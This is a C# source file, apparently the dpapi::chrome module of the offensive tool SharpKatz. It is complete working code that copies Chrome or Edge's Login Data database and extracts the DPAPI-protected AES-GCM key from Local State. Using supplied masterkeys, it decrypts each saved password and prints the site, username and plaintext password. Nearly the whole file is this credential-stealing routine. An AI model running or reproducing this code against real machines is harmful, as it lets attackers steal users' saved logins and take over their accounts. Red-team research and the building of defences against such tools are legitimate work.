//
// Author: Johto
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
// Module: dpapi::chrome - Decrypt Chrome/Edge saved passwords
//
// Chrome < v80:  Passwords encrypted directly with DPAPI
// Chrome >= v80: AES-256-GCM with key from Local State (DPAPI-protected)
//
// Typical paths:
//   Chrome:   %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
//   Edge:     %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
//   Local State: %LOCALAPPDATA%\Google\Chrome\User Data\Local State
//

using SharpKatz.Crypto;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    class DpapiChrome
    {
        // Chrome v10/v11 encrypted password format:
        // Bytes 0-2:  version prefix "v10" or "v11"
        // Bytes 3-14: 12-byte nonce (IV for AES-GCM)
        // Bytes 15..: ciphertext + 16-byte GCM auth tag (last 16 bytes)

        private const int GCM_NONCE_SIZE = 12;
        private const int GCM_TAG_SIZE = 16;

        /// <summary>
        /// Entry point for dpapi::chrome
        /// Decrypt Chrome/Edge saved passwords
        /// </summary>
        public static bool DecryptChromePasswords(string loginDataPath, string localStatePath, string masterkeyHex, string mkGuid, string mkFile)
        {
            Console.WriteLine("\n  [*] dpapi::chrome");

            // Load masterkeys for DPAPI decryption
            if (!string.IsNullOrEmpty(mkFile))
            {
                int loaded = DpapiBlob.LoadMasterkeysFromFile(mkFile);
                Console.WriteLine("   [*] Loaded {0} masterkey(s) from file", loaded);
            }
            if (!string.IsNullOrEmpty(mkGuid) && !string.IsNullOrEmpty(masterkeyHex))
            {
                byte[] mk = DpapiMasterkey.HexStringToBytes(masterkeyHex);
                if (mk != null)
                {
                    DpapiBlob.AddMasterkey(mkGuid, mk);
                    Console.WriteLine("   [*] Added masterkey {0}", mkGuid);
                }
            }

            if (!File.Exists(loginDataPath))
            {
                Console.WriteLine("   [-] Login Data file not found: {0}", loginDataPath);
                return false;
            }

            Console.WriteLine("   [*] Login Data: {0}", loginDataPath);

            // Step 1: Extract AES key from Local State (for Chrome v80+)
            byte[] aesGcmKey = null;
            if (!string.IsNullOrEmpty(localStatePath))
            {
                if (File.Exists(localStatePath))
                {
                    aesGcmKey = ExtractChromeKey(localStatePath);
                    if (aesGcmKey != null)
                        Console.WriteLine("   [+] AES-GCM key extracted from Local State ({0} bytes)", aesGcmKey.Length);
                    else
                        Console.WriteLine("   [-] Failed to extract AES-GCM key from Local State");
                }
                else
                {
                    Console.WriteLine("   [-] Local State file not found: {0}", localStatePath);
                }
            }

            // Step 2: Read Login Data SQLite database
            // Copy the file since Chrome may lock it
            string tempFile = loginDataPath + ".tmp_sharpkatz";
            try
            {
                File.Copy(loginDataPath, tempFile, true);
            }
            catch
            {
                // If copy fails, try reading directly
                tempFile = loginDataPath;
            }

            try
            {
                List<ChromeLogin> logins = ReadLoginDataSqlite(tempFile);
                if (logins == null || logins.Count == 0)
                {
                    Console.WriteLine("   [-] No login entries found in database");
                    return false;
                }

                Console.WriteLine("   [*] Found {0} login entries", logins.Count);

                int decrypted = 0;
                foreach (var login in logins)
                {
                    Console.WriteLine("\n   ────────────────────────────────────");
                    Console.WriteLine("   URL      : {0}", login.OriginUrl);
                    Console.WriteLine("   Username : {0}", login.Username);

                    if (login.EncryptedPassword == null || login.EncryptedPassword.Length == 0)
                    {
                        Console.WriteLine("   Password : (empty)");
                        continue;
                    }

                    byte[] plaintextPwd = null;

                    // Check for v10/v11 prefix (Chrome v80+)
                    if (login.EncryptedPassword.Length > 3 &&
                        login.EncryptedPassword[0] == (byte)'v' &&
                        login.EncryptedPassword[1] == (byte)'1' &&
                        (login.EncryptedPassword[2] == (byte)'0' || login.EncryptedPassword[2] == (byte)'1'))
                    {
                        if (aesGcmKey != null)
                        {
                            plaintextPwd = DecryptAesGcm(login.EncryptedPassword, aesGcmKey);
                        }
                        else
                        {
                            Console.WriteLine("   Password : (v10/v11 encrypted — provide Local State for AES key)");
                            continue;
                        }
                    }
                    else
                    {
                        // Old DPAPI-based encryption (pre v80)
                        plaintextPwd = DpapiBlob.DecryptBlobBytesWithCache(login.EncryptedPassword);
                    }

                    if (plaintextPwd != null && plaintextPwd.Length > 0)
                    {
                        string pwd = Encoding.UTF8.GetString(plaintextPwd).TrimEnd('\0');
                        Console.WriteLine("   Password : {0}", pwd);
                        decrypted++;
                    }
                    else
                    {
                        Console.WriteLine("   Password : (decryption failed)");
                    }
                }

                Console.WriteLine("\n   [+] Decrypted {0}/{1} passwords", decrypted, logins.Count);
                return decrypted > 0;
            }
            finally
            {
                // Clean up temp file
                if (tempFile != loginDataPath)
                {
                    try { File.Delete(tempFile); } catch { }
                }
            }
        }

        /// <summary>
        /// Extract AES-GCM key from Chrome's Local State JSON file
        /// The key is stored as: {"os_crypt":{"encrypted_key":"BASE64..."}}
        /// The base64 value is: "DPAPI" (5 bytes) + DPAPI blob
        /// </summary>
        private static byte[] ExtractChromeKey(string localStatePath)
        {
            try
            {
                string json = File.ReadAllText(localStatePath);

                // Simple JSON parsing — find "encrypted_key":"..."
                string marker = "\"encrypted_key\"";
                int idx = json.IndexOf(marker);
                if (idx < 0)
                {
                    Console.WriteLine("   [-] encrypted_key not found in Local State");
                    return null;
                }

                // Find the value
                idx = json.IndexOf(':', idx + marker.Length);
                if (idx < 0) return null;

                idx = json.IndexOf('"', idx + 1);
                if (idx < 0) return null;
                idx++; // skip opening quote

                int endIdx = json.IndexOf('"', idx);
                if (endIdx < 0) return null;

                string b64Key = json.Substring(idx, endIdx - idx);
                byte[] keyData = Convert.FromBase64String(b64Key);

                // Strip "DPAPI" prefix (5 bytes: 0x44,0x50,0x41,0x50,0x49)
                if (keyData.Length <= 5)
                {
                    Console.WriteLine("   [-] encrypted_key too short");
                    return null;
                }

                if (keyData[0] == 'D' && keyData[1] == 'P' && keyData[2] == 'A' && keyData[3] == 'P' && keyData[4] == 'I')
                {
                    byte[] dpapiBlob = new byte[keyData.Length - 5];
                    Array.Copy(keyData, 5, dpapiBlob, 0, dpapiBlob.Length);

                    // Decrypt DPAPI blob using cached masterkeys
                    byte[] decryptedKey = DpapiBlob.DecryptBlobBytesWithCache(dpapiBlob);
                    if (decryptedKey != null)
                        return decryptedKey;

                    Console.WriteLine("   [-] DPAPI decryption of Chrome key failed (masterkey not available)");
                    return null;
                }
                else
                {
                    Console.WriteLine("   [-] encrypted_key does not have DPAPI prefix");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("   [-] Error reading Local State: {0}", ex.Message);
                return null;
            }
        }

        /// <summary>
        /// Decrypt Chrome v80+ AES-256-GCM encrypted password
        /// Format: "v10" or "v11" (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
        /// </summary>
        private static byte[] DecryptAesGcm(byte[] encrypted, byte[] key)
        {
            if (encrypted == null || encrypted.Length < 3 + GCM_NONCE_SIZE + GCM_TAG_SIZE + 1)
                return null;

            try
            {
                // Skip version prefix (3 bytes)
                int offset = 3;

                // Extract nonce (12 bytes)
                byte[] nonce = new byte[GCM_NONCE_SIZE];
                Array.Copy(encrypted, offset, nonce, 0, GCM_NONCE_SIZE);
                offset += GCM_NONCE_SIZE;

                // Remaining = ciphertext + auth tag (last 16 bytes)
                int ciphertextLen = encrypted.Length - offset - GCM_TAG_SIZE;
                if (ciphertextLen <= 0)
                    return null;

                byte[] ciphertext = new byte[ciphertextLen];
                Array.Copy(encrypted, offset, ciphertext, 0, ciphertextLen);

                byte[] tag = new byte[GCM_TAG_SIZE];
                Array.Copy(encrypted, offset + ciphertextLen, tag, 0, GCM_TAG_SIZE);

                // Use BCrypt AES-GCM decryption
                return BcryptAesGcmDecrypt(key, nonce, ciphertext, tag);
            }
            catch (Exception ex)
            {
                Console.WriteLine("   [-] AES-GCM decrypt error: {0}", ex.Message);
                return null;
            }
        }

        /// <summary>
        /// AES-256-GCM decryption using Windows BCrypt API
        /// </summary>
        private static byte[] BcryptAesGcmDecrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
        {
            SafeBCryptAlgorithmHandle hAlg;
            int status = BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
            if (status != 0)
            {
                Console.WriteLine("   [-] BCryptOpenAlgorithmProvider failed: 0x{0:X8}", status);
                return null;
            }

            using (hAlg)
            {
                // Set chaining mode to GCM
                string gcmMode = "ChainingModeGCM";
                status = BCryptSetProperty(hAlg, "ChainingMode", gcmMode, gcmMode.Length * 2, 0);
                if (status != 0)
                {
                    Console.WriteLine("   [-] BCryptSetProperty GCM failed: 0x{0:X8}", status);
                    return null;
                }

                // Generate symmetric key
                GCHandle keyPinned = GCHandle.Alloc(key, GCHandleType.Pinned);
                try
                {
                    SafeBCryptKeyHandle hKey;
                    status = BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0,
                        keyPinned.AddrOfPinnedObject(), key.Length, 0);
                    if (status != 0)
                    {
                        Console.WriteLine("   [-] BCryptGenerateSymmetricKey failed: 0x{0:X8}", status);
                        return null;
                    }

                    using (hKey)
                    {
                        // Build BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO structure
                        // This is needed for GCM decryption
                        return BcryptGcmDecryptWithKey(hKey, nonce, ciphertext, tag);
                    }
                }
                finally
                {
                    keyPinned.Free();
                }
            }
        }

        // BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO structure
        // See: https://docs.microsoft.com/en-us/windows/win32/api/bcrypt/ns-bcrypt-bcrypt_authenticated_cipher_mode_info
        [StructLayout(LayoutKind.Sequential)]
        struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
        {
            public uint cbSize;          // sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO)
            public uint dwInfoVersion;   // BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION (1)
            public IntPtr pbNonce;       // nonce
            public uint cbNonce;         // nonce size
            public IntPtr pbAuthData;    // additional authenticated data (AAD)
            public uint cbAuthData;      // AAD size
            public IntPtr pbTag;         // authentication tag
            public uint cbTag;           // tag size
            public IntPtr pbMacContext;  // MAC context buffer
            public uint cbMacContext;    // MAC context size
            public uint cbAAD;           // cumulative AAD size
            public ulong cbData;         // cumulative data size
            public uint dwFlags;         // flags
        }

        private static byte[] BcryptGcmDecryptWithKey(SafeBCryptKeyHandle hKey, byte[] nonce, byte[] ciphertext, byte[] tag)
        {
            // Pin all buffers
            GCHandle noncePinned = GCHandle.Alloc(nonce, GCHandleType.Pinned);
            GCHandle tagPinned = GCHandle.Alloc(tag, GCHandleType.Pinned);
            GCHandle ciphertextPinned = GCHandle.Alloc(ciphertext, GCHandleType.Pinned);

            try
            {
                // Build auth info struct
                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
                authInfo.cbSize = (uint)Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
                authInfo.dwInfoVersion = 1; // BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION
                authInfo.pbNonce = noncePinned.AddrOfPinnedObject();
                authInfo.cbNonce = (uint)nonce.Length;
                authInfo.pbTag = tagPinned.AddrOfPinnedObject();
                authInfo.cbTag = (uint)tag.Length;
                authInfo.pbAuthData = IntPtr.Zero;
                authInfo.cbAuthData = 0;
                authInfo.pbMacContext = IntPtr.Zero;
                authInfo.cbMacContext = 0;
                authInfo.cbAAD = 0;
                authInfo.cbData = 0;
                authInfo.dwFlags = 0;

                // Allocate and pin the auth info struct
                IntPtr pAuthInfo = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO)));
                Marshal.StructureToPtr(authInfo, pAuthInfo, false);

                try
                {
                    // Allocate output buffer
                    byte[] plaintext = new byte[ciphertext.Length];
                    GCHandle plaintextPinned = GCHandle.Alloc(plaintext, GCHandleType.Pinned);

                    try
                    {
                        int bytesWritten;
                        int status = BCryptDecrypt(
                            hKey,
                            ciphertextPinned.AddrOfPinnedObject(),
                            ciphertext.Length,
                            pAuthInfo,          // pPaddingInfo = auth info for GCM
                            IntPtr.Zero,        // pbIV (nonce is in auth info for GCM)
                            0,                  // cbIV
                            plaintextPinned.AddrOfPinnedObject(),
                            plaintext.Length,
                            out bytesWritten,
                            0);

                        if (status != 0)
                        {
                            Console.WriteLine("   [-] BCryptDecrypt GCM failed: 0x{0:X8}", status);
                            return null;
                        }

                        if (bytesWritten < plaintext.Length)
                        {
                            byte[] result = new byte[bytesWritten];
                            Array.Copy(plaintext, result, bytesWritten);
                            return result;
                        }
                        return plaintext;
                    }
                    finally
                    {
                        plaintextPinned.Free();
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(pAuthInfo);
                }
            }
            finally
            {
                noncePinned.Free();
                tagPinned.Free();
                ciphertextPinned.Free();
            }
        }

        // ────────────────────────────────────────────────────────────────
        // Minimal SQLite3 reader — only reads login data table
        // ────────────────────────────────────────────────────────────────

        class ChromeLogin
        {
            public string OriginUrl;
            public string Username;
            public byte[] EncryptedPassword;
        }

        /// <summary>
        /// Read Chrome Login Data SQLite database
        /// Extracts: origin_url, username_value, password_value
        /// </summary>
        private static List<ChromeLogin> ReadLoginDataSqlite(string dbPath)
        {
            var logins = new List<ChromeLogin>();

            try
            {
                byte[] db = File.ReadAllBytes(dbPath);

                // Validate SQLite header magic
                // "SQLite format 3\000"
                if (db.Length < 100)
                    return logins;

                string magic = Encoding.ASCII.GetString(db, 0, 15);
                if (magic != "SQLite format 3")
                {
                    Console.WriteLine("   [-] Not a valid SQLite database");
                    return logins;
                }

                // Read header
                int pageSize = ReadBigEndianUInt16(db, 16);
                if (pageSize == 1) pageSize = 65536;  // special case in SQLite

                // Read sqlite_master table to find "logins" table
                // sqlite_master is always on page 1 (the first page)
                // Page 1 has the 100-byte file header, then B-tree page header at offset 100

                // Find all table entries and locate "logins"
                // We scan all leaf table pages looking for the logins table definition
                int loginRootPage = FindTableRootPage(db, pageSize, "logins");
                if (loginRootPage <= 0)
                {
                    Console.WriteLine("   [-] 'logins' table not found in database");
                    return logins;
                }

                Console.WriteLine("   [*] Found 'logins' table at page {0}", loginRootPage);

                // Read records from the logins table
                ReadTableRecords(db, pageSize, loginRootPage, logins);
            }
            catch (Exception ex)
            {
                Console.WriteLine("   [-] SQLite read error: {0}", ex.Message);
            }

            return logins;
        }

        /// <summary>
        /// Find the root page number of a named table in sqlite_master
        /// sqlite_master is always rooted at page 1
        /// </summary>
        private static int FindTableRootPage(byte[] db, int pageSize, string tableName)
        {
            // Parse page 1 (sqlite_master) — starts at offset 0
            // Page 1 has 100-byte database header, then B-tree header at 100
            return FindTableInBtree(db, pageSize, 1, tableName);
        }

        private static int FindTableInBtree(byte[] db, int pageSize, int pageNum, string tableName)
        {
            int pageOffset = (pageNum - 1) * pageSize;
            int headerOffset = pageOffset;

            // Page 1 has 100-byte DB header
            if (pageNum == 1)
                headerOffset = 100;

            if (headerOffset >= db.Length)
                return -1;

            byte pageType = db[headerOffset];

            if (pageType == 13) // Leaf table b-tree page
            {
                // Parse cells on this page
                ushort cellCount = ReadBigEndianUInt16(db, headerOffset + 3);
                int cellPointerStart = headerOffset + 8;

                for (int i = 0; i < cellCount; i++)
                {
                    if (cellPointerStart + i * 2 + 1 >= db.Length)
                        break;

                    ushort cellOffset = ReadBigEndianUInt16(db, cellPointerStart + i * 2);
                    int absOffset = pageOffset + cellOffset;

                    if (absOffset >= db.Length)
                        continue;

                    // Cell format: payload_length (varint), rowid (varint), payload
                    int pos = absOffset;
                    long payloadLen = ReadVarint(db, ref pos);
                    long rowid = ReadVarint(db, ref pos);

                    if (payloadLen <= 0 || pos + payloadLen > db.Length)
                        continue;

                    // Parse record header
                    int recordStart = pos;
                    long headerSize = ReadVarint(db, ref pos);
                    int headerEnd = recordStart + (int)headerSize;

                    // sqlite_master columns: type, name, tbl_name, rootpage, sql
                    // Read serial types for each column
                    List<long> serialTypes = new List<long>();
                    while (pos < headerEnd && pos < db.Length)
                    {
                        serialTypes.Add(ReadVarint(db, ref pos));
                    }

                    if (serialTypes.Count < 5)
                        continue;

                    // Data follows header
                    int dataPos = headerEnd;

                    // Column 0: type (text)
                    string type = ReadSqliteText(db, ref dataPos, serialTypes[0]);
                    // Column 1: name (text)
                    string name = ReadSqliteText(db, ref dataPos, serialTypes[1]);
                    // Column 2: tbl_name (text)
                    string tblName = ReadSqliteText(db, ref dataPos, serialTypes[2]);
                    // Column 3: rootpage (integer)
                    long rootPage = ReadSqliteInt(db, ref dataPos, serialTypes[3]);
                    // Column 4: sql (text) — skip

                    if (type != null && type.Equals("table", StringComparison.OrdinalIgnoreCase) &&
                        name != null && name.Equals(tableName, StringComparison.OrdinalIgnoreCase))
                    {
                        return (int)rootPage;
                    }
                }
            }
            else if (pageType == 5) // Interior table b-tree page
            {
                ushort cellCount = ReadBigEndianUInt16(db, headerOffset + 3);
                int rightMostPtr = (int)ReadBigEndianUInt32(db, headerOffset + 8);
                int cellPointerStart = headerOffset + 12;

                for (int i = 0; i < cellCount; i++)
                {
                    if (cellPointerStart + i * 2 + 1 >= db.Length)
                        break;

                    ushort cellOffset = ReadBigEndianUInt16(db, cellPointerStart + i * 2);
                    int absOffset = pageOffset + cellOffset;

                    // Interior cell: left-child page (4 bytes), key (varint)
                    int leftChild = (int)ReadBigEndianUInt32(db, absOffset);
                    int result = FindTableInBtree(db, pageSize, leftChild, tableName);
                    if (result > 0)
                        return result;
                }

                // Check rightmost pointer
                if (rightMostPtr > 0)
                {
                    int result = FindTableInBtree(db, pageSize, rightMostPtr, tableName);
                    if (result > 0)
                        return result;
                }
            }

            return -1;
        }

        /// <summary>
        /// Read all records from a table's B-tree
        /// Chrome logins table columns (typical order):
        ///   origin_url, action_url, username_element, username_value,
        ///   password_element, password_value, submit_element, signon_realm,
        ///   date_created, blacklisted_by_user, scheme, password_type,
        ///   times_used, form_data, display_name, icon_url,
        ///   federation_url, skip_zero_click, generation_upload_status,
        ///   possible_username_pairs, id, date_last_used, moving_blocked_for,
        ///   date_password_modified
        /// We need: origin_url (0), username_value (3), password_value (5)
        /// </summary>
        private static void ReadTableRecords(byte[] db, int pageSize, int pageNum, List<ChromeLogin> logins)
        {
            int pageOffset = (pageNum - 1) * pageSize;
            int headerOffset = pageOffset;
            if (pageNum == 1) headerOffset = 100;

            if (headerOffset >= db.Length)
                return;

            byte pageType = db[headerOffset];

            if (pageType == 13) // Leaf table b-tree page
            {
                ushort cellCount = ReadBigEndianUInt16(db, headerOffset + 3);
                int cellPointerStart = headerOffset + 8;

                for (int i = 0; i < cellCount; i++)
                {
                    if (cellPointerStart + i * 2 + 1 >= db.Length)
                        break;

                    ushort cellOffset = ReadBigEndianUInt16(db, cellPointerStart + i * 2);
                    int absOffset = pageOffset + cellOffset;

                    if (absOffset >= db.Length)
                        continue;

                    try
                    {
                        int pos = absOffset;
                        long payloadLen = ReadVarint(db, ref pos);
                        long rowid = ReadVarint(db, ref pos);

                        // Handle overflow pages — if payload > usable, only first part is here
                        long usableSize = pageSize - 0; // reserved = 0 for most files
                        long maxLocal;
                        if (pageNum == 1)
                            maxLocal = (usableSize - 100 - 35) * 64 / 255 - 23;
                        else
                            maxLocal = (usableSize - 12) * 64 / 255 - 23;

                        // For simplicity, skip overflow records
                        if (payloadLen > maxLocal || payloadLen <= 0 || pos + payloadLen > db.Length)
                            continue;

                        // Parse record
                        int recordStart = pos;
                        long headerSize = ReadVarint(db, ref pos);
                        int headerEnd = recordStart + (int)headerSize;

                        List<long> serialTypes = new List<long>();
                        while (pos < headerEnd && pos < db.Length)
                        {
                            serialTypes.Add(ReadVarint(db, ref pos));
                        }

                        if (serialTypes.Count < 6)
                            continue;

                        int dataPos = headerEnd;

                        // Read columns in order
                        // We need: [0] origin_url, [3] username_value, [5] password_value
                        string[] textValues = new string[6];
                        byte[] passwordBlob = null;

                        for (int col = 0; col < serialTypes.Count && col <= 5; col++)
                        {
                            long stype = serialTypes[col];
                            if (col == 5) // password_value — blob
                            {
                                passwordBlob = ReadSqliteBlob(db, ref dataPos, stype);
                            }
                            else if (col == 0 || col == 3) // origin_url, username_value
                            {
                                textValues[col] = ReadSqliteText(db, ref dataPos, stype);
                            }
                            else
                            {
                                // Skip this column
                                SkipSqliteValue(db, ref dataPos, stype);
                            }
                        }

                        if (textValues[0] != null || textValues[3] != null || passwordBlob != null)
                        {
                            logins.Add(new ChromeLogin
                            {
                                OriginUrl = textValues[0] ?? "",
                                Username = textValues[3] ?? "",
                                EncryptedPassword = passwordBlob
                            });
                        }
                    }
                    catch
                    {
                        continue;
                    }
                }
            }
            else if (pageType == 5) // Interior table b-tree page
            {
                ushort cellCount = ReadBigEndianUInt16(db, headerOffset + 3);
                int rightMostPtr = (int)ReadBigEndianUInt32(db, headerOffset + 8);
                int cellPointerStart = headerOffset + 12;

                for (int i = 0; i < cellCount; i++)
                {
                    if (cellPointerStart + i * 2 + 1 >= db.Length)
                        break;

                    ushort cellOffset = ReadBigEndianUInt16(db, cellPointerStart + i * 2);
                    int absOffset = pageOffset + cellOffset;

                    int leftChild = (int)ReadBigEndianUInt32(db, absOffset);
                    ReadTableRecords(db, pageSize, leftChild, logins);
                }

                if (rightMostPtr > 0)
                    ReadTableRecords(db, pageSize, rightMostPtr, logins);
            }
        }

        // ────────────────────────────────────────────────────────────────
        // SQLite format helpers
        // ────────────────────────────────────────────────────────────────

        private static ushort ReadBigEndianUInt16(byte[] data, int offset)
        {
            if (offset + 1 >= data.Length) return 0;
            return (ushort)((data[offset] << 8) | data[offset + 1]);
        }

        private static uint ReadBigEndianUInt32(byte[] data, int offset)
        {
            if (offset + 3 >= data.Length) return 0;
            return (uint)((data[offset] << 24) | (data[offset + 1] << 16) | (data[offset + 2] << 8) | data[offset + 3]);
        }

        /// <summary>
        /// Read SQLite varint (1-9 bytes, big-endian with high-bit continuation)
        /// </summary>
        private static long ReadVarint(byte[] data, ref int offset)
        {
            long result = 0;
            for (int i = 0; i < 9 && offset < data.Length; i++)
            {
                byte b = data[offset++];
                if (i < 8)
                {
                    result = (result << 7) | (long)(b & 0x7F);
                    if ((b & 0x80) == 0)
                        return result;
                }
                else
                {
                    // 9th byte uses all 8 bits
                    result = (result << 8) | b;
                }
            }
            return result;
        }

        /// <summary>
        /// Read a text value based on SQLite serial type
        /// Serial type >= 13 and odd => text, length = (type-13)/2
        /// </summary>
        private static string ReadSqliteText(byte[] data, ref int offset, long serialType)
        {
            if (serialType == 0) return null;           // NULL
            if (serialType >= 1 && serialType <= 6)     // integer
            {
                ReadSqliteInt(data, ref offset, serialType);
                return null;
            }
            if (serialType == 7) { offset += 8; return null; }  // float
            if (serialType == 8 || serialType == 9) return null; // 0 or 1
            if (serialType >= 12 && (serialType % 2) == 0) // blob
            {
                int len = (int)(serialType - 12) / 2;
                offset += len;
                return null;
            }
            if (serialType >= 13 && (serialType % 2) == 1) // text
            {
                int len = (int)(serialType - 13) / 2;
                if (offset + len > data.Length) { offset = data.Length; return null; }
                string result = Encoding.UTF8.GetString(data, offset, len);
                offset += len;
                return result;
            }
            return null;
        }

        /// <summary>
        /// Read a blob value based on SQLite serial type
        /// Serial type >= 12 and even => blob, length = (type-12)/2
        /// </summary>
        private static byte[] ReadSqliteBlob(byte[] data, ref int offset, long serialType)
        {
            if (serialType == 0) return null;
            if (serialType >= 1 && serialType <= 6)
            {
                ReadSqliteInt(data, ref offset, serialType);
                return null;
            }
            if (serialType == 7) { offset += 8; return null; }
            if (serialType == 8 || serialType == 9) return null;
            if (serialType >= 12 && (serialType % 2) == 0) // blob
            {
                int len = (int)(serialType - 12) / 2;
                if (offset + len > data.Length) { offset = data.Length; return null; }
                byte[] result = new byte[len];
                Array.Copy(data, offset, result, 0, len);
                offset += len;
                return result;
            }
            if (serialType >= 13 && (serialType % 2) == 1) // text
            {
                int len = (int)(serialType - 13) / 2;
                if (offset + len > data.Length) { offset = data.Length; return null; }
                byte[] result = new byte[len];
                Array.Copy(data, offset, result, 0, len);
                offset += len;
                return result;
            }
            return null;
        }

        /// <summary>
        /// Read integer value based on SQLite serial type
        /// </summary>
        private static long ReadSqliteInt(byte[] data, ref int offset, long serialType)
        {
            switch (serialType)
            {
                case 0: return 0; // NULL
                case 1: // 1-byte signed int
                    if (offset >= data.Length) return 0;
                    return (sbyte)data[offset++];
                case 2: // 2-byte big-endian signed int
                    if (offset + 1 >= data.Length) { offset = data.Length; return 0; }
                    { short val = (short)((data[offset] << 8) | data[offset + 1]); offset += 2; return val; }
                case 3: // 3-byte big-endian signed int
                    if (offset + 2 >= data.Length) { offset = data.Length; return 0; }
                    { int val = (data[offset] << 16) | (data[offset + 1] << 8) | data[offset + 2];
                      if ((val & 0x800000) != 0) val |= unchecked((int)0xFF000000); // sign extend
                      offset += 3; return val; }
                case 4: // 4-byte big-endian signed int
                    if (offset + 3 >= data.Length) { offset = data.Length; return 0; }
                    { int val = (data[offset] << 24) | (data[offset + 1] << 16) | (data[offset + 2] << 8) | data[offset + 3];
                      offset += 4; return val; }
                case 5: // 6-byte big-endian signed int
                    if (offset + 5 >= data.Length) { offset = data.Length; return 0; }
                    { long val = ((long)data[offset] << 40) | ((long)data[offset + 1] << 32) | ((long)data[offset + 2] << 24) |
                                 ((long)data[offset + 3] << 16) | ((long)data[offset + 4] << 8) | data[offset + 5];
                      if ((val & 0x800000000000L) != 0) val |= unchecked((long)0xFFFF000000000000L);
                      offset += 6; return val; }
                case 6: // 8-byte big-endian signed int
                    if (offset + 7 >= data.Length) { offset = data.Length; return 0; }
                    { long val = ((long)data[offset] << 56) | ((long)data[offset + 1] << 48) | ((long)data[offset + 2] << 40) |
                                 ((long)data[offset + 3] << 32) | ((long)data[offset + 4] << 24) | ((long)data[offset + 5] << 16) |
                                 ((long)data[offset + 6] << 8) | data[offset + 7];
                      offset += 8; return val; }
                case 8: return 0;
                case 9: return 1;
                default: return 0;
            }
        }

        /// <summary>
        /// Skip a value of any serial type
        /// </summary>
        private static void SkipSqliteValue(byte[] data, ref int offset, long serialType)
        {
            switch (serialType)
            {
                case 0: break;
                case 1: offset += 1; break;
                case 2: offset += 2; break;
                case 3: offset += 3; break;
                case 4: offset += 4; break;
                case 5: offset += 6; break;
                case 6: offset += 8; break;
                case 7: offset += 8; break;
                case 8: break;
                case 9: break;
                default:
                    if (serialType >= 12 && (serialType % 2) == 0)
                        offset += (int)(serialType - 12) / 2;
                    else if (serialType >= 13 && (serialType % 2) == 1)
                        offset += (int)(serialType - 13) / 2;
                    break;
            }
            if (offset > data.Length) offset = data.Length;
        }
    }
}
